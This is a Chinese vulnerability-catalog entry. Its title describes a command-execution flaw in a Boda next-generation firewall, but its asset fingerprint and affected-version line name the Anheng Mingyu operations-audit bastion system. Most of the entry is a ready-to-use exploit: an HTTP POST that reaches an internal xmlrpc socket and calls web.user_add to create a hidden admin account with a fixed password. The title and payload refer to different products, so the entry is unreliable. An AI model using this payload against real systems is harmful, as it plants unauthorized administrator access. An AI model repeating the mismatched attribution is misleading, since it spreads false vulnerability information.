# 博达下一代防火墙aaa_portal_auth_local_submit存在命令执行漏洞

- **系统**：博达下一代防火墙　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`hunter:`app.name=="安恒明御运维审计与风险控制系统"``
- **请求**：`POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sockhttp://test/wsrpc HTTP/1.1`

**请求体 / payload**
```
使用exp添加用户`qaxnb666/Admin123..`
Host: xx.xx.xx.xx
Content-Length: 1112
<?xml version="1.0"?>
<methodCall>
<methodName>web.user_add</methodName>
<params>
<param>
<value>
<array>
<data>
<value>
<string>admin</string>
</value>
<value>
<string>5</string>
</value>
<value>
<string>10.17.1.1</string>
</value>
</data>
</array>
</value>
</param>
<param>
<value>
<struct>
<member>
<name>uname</name>
<value>
<string>qaxnb666</string>
</value>
</member>
<member>
<name>name</name>
<value>
<string>yuwe</string>
</value>
</member>
<member>
<name>pwd</name>
<value>
<string>Admin123..</string>
</value>
</member>…（脚本共 1103 字，完整版见原文）
```

**其他**
- 博达下一代防火墙aaa\_portal\_auth\_local\_submit存在命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 安恒明御运维审计与风险控制系统